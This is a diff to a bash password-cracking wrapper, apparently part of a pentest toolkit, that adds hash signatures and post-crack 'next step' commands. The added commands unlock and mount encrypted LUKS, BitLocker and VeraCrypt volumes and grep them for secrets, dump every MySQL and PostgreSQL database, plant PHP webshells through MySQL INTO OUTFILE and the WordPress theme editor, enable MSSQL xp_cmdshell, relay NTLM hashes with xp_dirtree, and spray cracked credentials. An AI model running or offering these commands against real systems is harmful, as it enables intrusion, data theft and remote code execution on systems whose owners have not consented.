@@ -97,6 +97,7 @@ declare -A WORDLISTS=(
     [xato1m]="/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt"
     [darkweb]="/usr/share/seclists/Passwords/darkweb2017-top10000.txt"
     [top10k]="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
+    [defaultcreds]="/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt"
 )
 
 # ── Rule shortcuts ──────────────────────────────────────────────────────────
@@ -168,6 +169,31 @@ write_crack_next_steps() {
                 echo "find /tmp/cracked_extract -type f -maxdepth 5 -ls 2>/dev/null"
                 echo "grep -RniE 'pass|password|secret|key|token|cred|user|db_' /tmp/cracked_extract 2>/dev/null | head -50"
                 ;;
+            luks:*)
+                echo "[ LUKS VOLUME PASSPHRASE CRACKED ]"
+                echo "# Evidence: luks2john extraction plus cracked output"
+                echo "# Unlock the original container:"
+                echo "sudo cryptsetup luksOpen <device_or_image> cracked_vol   # enter: ${ex_pass}"
+                echo "sudo mount /dev/mapper/cracked_vol /mnt/cracked"
+                echo "ls -la /mnt/cracked"
+                echo "grep -RniE 'pass|ssh|token|cred|root' /mnt/cracked 2>/dev/null | head -50"
+                ;;
+            bitlocker:*)
+                echo "[ BITLOCKER VOLUME PASSWORD CRACKED ]"
+                echo "# Evidence: bitlocker2john extraction plus cracked output"
+                echo "# Mount with dislocker (user password):"
+                echo "sudo mkdir -p /mnt/bl_raw /mnt/bl_mount"
+                echo "sudo dislocker-fuse -v -u'${ex_pass}' <device_or_image> /mnt/bl_raw"
+                echo "sudo mount -o loop,ro /mnt/bl_raw/dislocker-file /mnt/bl_mount"
+                echo "ls -la /mnt/bl_mount"
+                ;;
+            truecrypt:*|veracrypt:*)
+                echo "[ TRUECRYPT / VERACRYPT CONTAINER CRACKED ]"
+                echo "# Evidence: truecrypt2john / veracrypt extraction plus cracked output"
+                echo "veracrypt --text --non-interactive --password='${ex_pass}' --mount <container> /mnt/vc"
+                echo "ls -la /mnt/vc"
+                echo "grep -RniE 'pass|ssh|token|cred' /mnt/vc 2>/dev/null | head -50"
+                ;;
             wpa:*)
                 echo "[ WPA PASSPHRASE CRACKED ]"
                 echo "# Evidence: WPA capture extraction plus cracked output"
@@ -210,7 +236,7 @@ write_crack_next_steps() {
                 echo "evil-winrm -i ${ex_dc} -u '${ex_user}' -p '${ex_pass}'"
                 echo "nxc smb ${ex_dc} -u '${ex_user}' -p '${ex_pass}' --shares"
                 ;;
-            *:1800|*:500|*:400|*:3200)
+            *:1800|*:500|*:3200|*:7400)
                 echo "[ LINUX SYSTEM HASH CRACKED ]"
                 echo "# Evidence: Linux crypt hash mode ${local_mode} (${local_desc})"
                 echo "ssh '${ex_user}'@${ex_dc}"
@@ -237,6 +263,59 @@ write_crack_next_steps() {
                 echo "impacket-mssqlclient ${ex_domain}/'${ex_user}':'${ex_pass}'@${ex_dc}"
                 echo "nxc mssql ${ex_dc} -u '${ex_user}' -p '${ex_pass}' -q 'SELECT @@version'"
                 echo "./sprayr.sh -u '${ex_user}' -p '${ex_pass}' -t ${ex_dc}"
+                ;;
+            *:300)
+                echo "[ MYSQL HASH CRACKED ]"
+                echo "# Evidence: MySQL 4.1+ SHA1 hash mode 300"
+                echo "mysql -h ${ex_dc} -u '${ex_user}' -p'${ex_pass}'"
+                echo "mysqldump -h ${ex_dc} -u '${ex_user}' -p'${ex_pass}' --all-databases > /tmp/all_dbs.sql"
+                echo "grep -iE 'insert into (users|admin|accounts)|password|secret|token' /tmp/all_dbs.sql | head -50"
+                echo "# Pivot to shell via FILE privilege (if granted):"
+                echo "#   SQL> SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/sh.php';"
+                ;;
+            *:12)
+                echo "[ POSTGRESQL HASH CRACKED ]"
+                echo "# Evidence: PostgreSQL md5(user+pass) hash mode 12"
+                echo "PGPASSWORD='${ex_pass}' psql -h ${ex_dc} -U '${ex_user}'"
+                echo "PGPASSWORD='${ex_pass}' pg_dump -h ${ex_dc} -U '${ex_user}' postgres > /tmp/pg_dump.sql"
+                echo "# Pivot if superuser: COPY (SELECT '<payload>') TO PROGRAM 'id';"
+                ;;
+            *:400)
+                echo "[ PHPASS / WORDPRESS / PHPBB PASSWORD CRACKED ]"
+                echo "# Evidence: phpass hash mode 400 (WordPress / phpBB / Drupal6)"
+                echo "# WordPress — log in at /wp-login.php with: ${ex_user} / ${ex_pass}"
+                echo "wpscan --url http://${ex_dc} --username '${ex_user}' --password-attack 'wp-login' --passwords <(echo '${ex_pass}')"
+                echo "# After login — pivot to RCE via theme/plugin editor:"
+                echo "# /wp-admin/theme-editor.php  (edit 404.php with PHP webshell, then GET the theme's 404.php)"
+                echo "# Or: enum Metasploit's wp_admin_shell_upload on the creds (one allowed MSF use)"
+                ;;
+            *:112)
+                echo "[ ORACLE 11G HASH CRACKED ]"
+                echo "# Evidence: Oracle 11g S: type mode 112"
+                echo "sqlplus '${ex_user}/${ex_pass}@//${ex_dc}:1521/ORCL'"
+                echo "# Via odat (if installed):"
+                echo "odat all -s ${ex_dc} -d ORCL -U '${ex_user}' -P '${ex_pass}'"
+                ;;
+            *:7900)
+                echo "[ DRUPAL 7 PASSWORD CRACKED ]"
+                echo "# Evidence: Drupal7 hash mode 7900"
+                echo "# Log in at /user/login with: ${ex_user} / ${ex_pass}"
+                echo "droopescan scan drupal -u http://${ex_dc}"
+                echo "# If admin — PHP module upload leads to RCE:"
+                echo "# /admin/modules → install PHP Filter, then create node with <?php ?> block"
+                ;;
+            *:200)
+                echo "[ MYSQL323 (LEGACY) HASH CRACKED ]"
+                echo "# Evidence: MySQL323 hash mode 200"
+                echo "mysql -h ${ex_dc} -u '${ex_user}' -p'${ex_pass}' --default-auth=mysql_old_password"
+                ;;
+            *:3000)
+                echo "[ LM HASH CRACKED ]"
+                echo "# Evidence: LM hash mode 3000 (all-uppercase, <=14 chars)"
+                echo "# LM is case-insensitive — try case variants against NTLM next:"
+                echo "hashcat -m 1000 <ntlm_hash> -a 3 <(echo '${ex_pass}') --rules=toggles5"
+                echo "# Once NTLM plaintext recovered, spray:"
+                echo "./sprayr.sh -u '${ex_user}' -p '<ntlm_plaintext>' -d ${ex_domain} -t ${ex_dc}"
                 ;;
             *)
                 echo "[ CRACKED CREDENTIALS FOUND ]"
@@ -268,7 +347,7 @@ HASH_SIGNATURES=(
     # SAM dump and structured formats first (most specific)
     '^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$|1000|nt|NTLM (with LM pair)'
     # NTLMv1 — MUST come before NTLMv2 broad pattern (hex-length anchors prevent NTLMv2 false match)
-    '.*::.*:[a-fA-F0-9]{48}:[a-fA-F0-9]{48}:[a-fA-F0-9]+$|5500|netntlm|NTLMv1 (Net-NTLMv1)'
+    '.*::.*:[a-fA-F0-9]{48}:[a-fA-F0-9]{48}:[a-fA-F0-9]{16}$|5500|netntlm|NTLMv1 (Net-NTLMv1)'
     # Net-NTLMv2 (Responder captures) — broad pattern after NTLMv1
     '.*::.*:.*:.*:[a-fA-F0-9]+$|5600|netntlmv2|NTLMv2 (Net-NTLMv2)'
     # Kerberos
@@ -304,6 +383,13 @@ HASH_SIGNATURES=(
     '^0x0200[a-fA-F0-9]{136}$|1731|mssql12|MSSQL (2012+)'
     # MySQL
     '^\*[a-fA-F0-9]{40}$|300|mysql-sha1|MySQL 4.1+ (SHA1)'
+    # PostgreSQL (md5 + username)
+    '^md5[a-fA-F0-9]{32}$|12|postgres|PostgreSQL (md5(user+pass))'
+    # Oracle 11g S: type
+    '^[^:]+:S:[a-fA-F0-9]{60}$|112|oracle11g|Oracle 11g (S: type)'
+    '^S:[a-fA-F0-9]{60}$|112|oracle11g|Oracle 11g (S: type, no user)'
+    # Drupal7
+    '^\$S\$|7900|Drupal7|Drupal 7 ($S$)'
     # macOS
     '^\$ml\$|7100|macos-v2|macOS v10.8+ (PBKDF2-SHA512)'
     # Generic hex hashes — LAST (least specific)
@@ -652,6 +738,12 @@ identify_hash() {
 
     # Check for SAM dump format: user:rid:lm:ntlm:::
     if echo "$hash" | grep -qP '^[^:]+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}:::$'; then
+        local lm_half
+        lm_half=$(echo "$hash" | cut -d: -f3)
+        if [[ -n "$lm_half" && "$lm_half" != "aad3b435b51404eeaad3b435b51404ee" ]]; then
+            log_warn "SAM dump contains real LM half (${lm_half:0:8}...) — crack LM with -m 3000 separately:"
+            log_warn "  awk -F: '{print \$3}' <hashfile> | hashcat -m 3000 - /usr/share/wordlists/rockyou.txt"
+        fi
         echo "1000|nt|NTLM (SAM dump)"
         return
     fi
@@ -675,6 +767,14 @@ identify_hash() {
         log_warn "32-char hex detected: could be MD5 (mode 0) or NTLM (mode 1000)"
         log_warn "Defaulting to NTLM — use -m 0 to force MD5 if needed"
         echo "1000|nt|NTLM (32-char hex — could also be MD5, use -m 0 to override)"
+        return
+    fi
+
+    # ── Handle 16-char hex ambiguity: MySQL323 / LM-half / DES ──
+    if echo "$hash" | grep -qP '^[a-fA-F0-9]{16}$'; then
+        log_warn "16-char hex detected: could be MySQL323 (mode 200), LM half (mode 3000), or DES"
+        log_warn "Defaulting to MySQL323 — use -m 3000 for LM, -m 1500 for DES(Unix) as needed"
+        echo "200|mysql|MySQL323 (16-char hex — could also be LM -m 3000, use override if needed)"
         return
     fi
 
@@ -1022,7 +1122,7 @@ show_cracked() {
     log_info "Checking hashcat pot..."
     local potfile="${OUTPUT_DIR}/hashcat.potfile"
     if [[ -f "$potfile" ]]; then
-        for mode in 0 100 300 400 500 1000 1400 1600 1700 1800 2100 3200 5500 5600 7400 7500 13100 13400 18200 19600 19700; do
+        for mode in 0 11 12 100 112 124 131 200 300 400 500 1000 1400 1600 1700 1731 1800 2100 3000 3200 5500 5600 7400 7500 7900 10000 13100 13400 18200 19600 19700; do
             local result=""
             result=$(hashcat -m "$mode" "$hash_file" --potfile-path "$potfile" --show 2>/dev/null) || true
             if [[ -n "$result" ]]; then
@@ -1064,13 +1164,14 @@ run_quick_mode() {
     local jtr_fmt="$3"
     local tool="$4"
 
-    # Escalation: fasttrack → rockyou → rockyou+best64 → rockyou+rockyou-30000
-    # Matches methodology: best64 → rockyou-30000 → dive (dive skipped for time)
+    # Escalation: fasttrack → rockyou → rockyou+best64 → rockyou+rockyou-30000 → rockyou+onerule
+    # Matches methodology: best64 → rockyou-30000 → OneRuleToRuleThemAll (dive skipped for time)
     local stages=(
         "fasttrack|"
         "rockyou|"
         "rockyou|best64"
         "rockyou|rockyou-30000"
+        "rockyou|onerule"
     )
 
     for stage in "${stages[@]}"; do
@@ -1264,6 +1365,17 @@ run_hydra() {
     if [[ -z "$port" && -n "${HYDRA_DEFAULT_PORTS[$service]+_}" ]]; then
         port="${HYDRA_DEFAULT_PORTS[$service]}"
     fi
+
+    # Account-lockout warning for AD-joined services
+    case "$service" in
+        smb|smbnt|winrm|rdp|ldap|ldap3|ldaps)
+            if (( HYDRA_THREADS > 4 )); then
+                log_warn "${service} brute with -t ${HYDRA_THREADS} risks AD account lockout"
+                log_warn "  Consider: --hydra-threads 4   (or -t 1 for locked-down domains)"
+                log_warn "  Check policy first: nxc smb ${target} -u '' -p '' --pass-pol"
+            fi
+            ;;
+    esac
 
     local -a cmd=(hydra)
     local outfile
@@ -1483,6 +1595,60 @@ run_hydra() {
                 echo ""
                 echo -e "${GREEN}# Read mailbox (if IMAP available):${NC}"
                 echo "  curl -k imaps://${target}/INBOX -u '${ex_user}:${ex_pass}'"
+                ;;
+            mssql)
+                echo -e "${GREEN}# MSSQL access:${NC}"
+                echo "  impacket-mssqlclient '${ex_user}':'${ex_pass}'@${target}"
+                echo "  nxc mssql ${target} -u '${ex_user}' -p '${ex_pass}' -q 'SELECT @@version'"
+                echo ""
+                echo -e "${GREEN}# If xp_cmdshell enabled (or SA creds) — code execution:${NC}"
+                echo "  SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;"
+                echo "  SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
+                echo "  SQL> EXEC xp_cmdshell 'whoami';"
+                echo ""
+                echo -e "${GREEN}# NTLM hash steal via xp_dirtree (run Responder first):${NC}"
+                echo "  SQL> EXEC xp_dirtree '\\\\${KALI_IP:-<KALI_IP>}\\share';"
+                ;;
+            telnet)
+                echo -e "${GREEN}# Telnet access:${NC}"
+                echo "  telnet ${target}"
+                echo ""
+                echo -e "${GREEN}# Try root / escalation immediately:${NC}"
+                echo "  sudo -l"
+                echo "  find / -perm -4000 -type f 2>/dev/null"
+                echo "  ./escalatr.sh ${target} --os linux"
+                ;;
+            vnc)
+                echo -e "${GREEN}# VNC viewer:${NC}"
+                echo "  vncviewer ${target}::${port:-5900}   # paste password: ${ex_pass}"
+                echo "  xtightvncviewer ${target}::${port:-5900}"
+                echo ""
+                echo -e "${GREEN}# Test for reuse on SSH/SMB:${NC}"
+                echo "  ./sprayr.sh -u ${ex_user:-admin} -p '${ex_pass}' -t ${target}"
+                ;;
+            snmp)
+                echo -e "${GREEN}# SNMP community string cracked — enumerate:${NC}"
+                echo "  snmpwalk -v2c -c '${ex_pass}' ${target}"
+                echo "  snmp-check -c '${ex_pass}' ${target}"
+                echo "  # Processes (useful for creds in cmdline):"
+                echo "  snmpwalk -v2c -c '${ex_pass}' ${target} 1.3.6.1.2.1.25.4.2.1.2"
+                echo "  # Running cmdline arguments (may contain passwords):"
+                echo "  snmpwalk -v2c -c '${ex_pass}' ${target} 1.3.6.1.2.1.25.4.2.1.5"
+                echo "  # Installed software:"
+                echo "  snmpwalk -v2c -c '${ex_pass}' ${target} 1.3.6.1.2.1.25.6.3.1.2"
+                echo "  # TCP listeners:"
+                echo "  snmpwalk -v2c -c '${ex_pass}' ${target} 1.3.6.1.2.1.6.13.1.3"
+                ;;
+            pop3|imap)
+                echo -e "${GREEN}# Mailbox access:${NC}"
+                echo "  curl -k imaps://${target}/INBOX -u '${ex_user}:${ex_pass}'"
+                echo "  curl -k pop3s://${target}/ -u '${ex_user}:${ex_pass}'"
+                echo ""
+                echo -e "${GREEN}# List all folders (IMAP):${NC}"
+                echo "  curl -k 'imaps://${target}/' -X 'LIST \"\" *' -u '${ex_user}:${ex_pass}'"
+                echo ""
+                echo -e "${GREEN}# Test cred reuse:${NC}"
+                echo "  ./sprayr.sh -u ${ex_user} -p '${ex_pass}' -t ${target}"
                 ;;
             http-get|https-get|http-post-form|https-post-form)
                 echo -e "${GREEN}# Web login credentials found — enumerate authenticated content:${NC}"
@@ -1994,7 +2160,7 @@ if (( _cracked_lines > 0 )) || [[ -s "${_central_creds}" ]]; then
             echo "     evil-winrm -i ${_ex_dc} -u '${_ex_user}' -p '${_ex_pass}'"
             echo "     nxc smb ${_ex_dc} -u '${_ex_user}' -p '${_ex_pass}' --shares"
             ;;
-        1800|500|400|3200)  # Linux hashes
+        1800|500|3200|7400)  # Linux hashes (sha512crypt, md5crypt, bcrypt, sha256crypt)
             echo ""
             echo -e "${GREEN}Hash type: Linux system hash (${local_desc})${NC}"
             echo "→ These are local Linux user credentials. Next steps:"
@@ -2004,6 +2170,40 @@ if (( _cracked_lines > 0 )) || [[ -s "${_central_creds}" ]]; then
             echo "     su - '${_ex_user}'"
             echo "  3. Check if password reused elsewhere — spray if domain-joined:"
             echo "     ./sprayr.sh -u '${_ex_user}' -p '${_ex_pass}' -t ${_ex_dc}"
+            ;;
+        400)  # phpass (WordPress / phpBB / Drupal6)
+            echo ""
+            echo -e "${GREEN}Hash type: phpass (${local_desc})${NC}"
+            echo "→ WordPress / phpBB / Drupal6 user password. Next steps:"
+            echo "  1. Log in at the CMS admin page with: ${_ex_user} / ${_ex_pass}"
+            echo "     (WordPress: /wp-login.php — phpBB: /ucp.php?mode=login)"
+            echo "  2. WP admin → theme-editor RCE (edit 404.php with a PHP webshell):"
+            echo "     curl http://${_ex_dc}/wp-content/themes/<theme>/404.php?cmd=id"
+            echo "  3. Test credential reuse:"
+            echo "     ./sprayr.sh -u '${_ex_user}' -p '${_ex_pass}' -t ${_ex_dc}"
+            ;;
+        300)  # MySQL 4.1+
+            echo ""
+            echo -e "${GREEN}Hash type: MySQL 4.1+ SHA1 (${local_desc})${NC}"
+            echo "→ MySQL database credential. Next steps:"
+            echo "  1. mysql -h ${_ex_dc} -u '${_ex_user}' -p'${_ex_pass}'"
+            echo "  2. mysqldump -h ${_ex_dc} -u '${_ex_user}' -p'${_ex_pass}' --all-databases | grep -iE 'password|admin'"
+            echo "  3. If FILE priv: SQL> SELECT LOAD_FILE('/etc/passwd'); or INTO OUTFILE webshell"
+            ;;
+        12)  # PostgreSQL
+            echo ""
+            echo -e "${GREEN}Hash type: PostgreSQL md5 (${local_desc})${NC}"
+            echo "→ PostgreSQL credential. Next steps:"
+            echo "  1. PGPASSWORD='${_ex_pass}' psql -h ${_ex_dc} -U '${_ex_user}'"
+            echo "  2. pg_dump for full schema; check for stored secrets"
+            echo "  3. If superuser: COPY / PROGRAM pivot available"
+            ;;
+        112|7900|200|3000)  # Oracle / Drupal7 / MySQL323 / LM
+            echo ""
+            echo -e "${GREEN}Hash type: ${local_desc}${NC}"
+            echo "→ See ${OUTPUT_DIR}/next_steps.txt for mode-specific commands"
+            echo "  Credential: ${_ex_user} / ${_ex_pass}"
+            echo "  Cred reuse: ./sprayr.sh -u '${_ex_user}' -p '${_ex_pass}' -t ${_ex_dc}"
             ;;
         2100)  # DCC2 / MSCash2
             echo ""
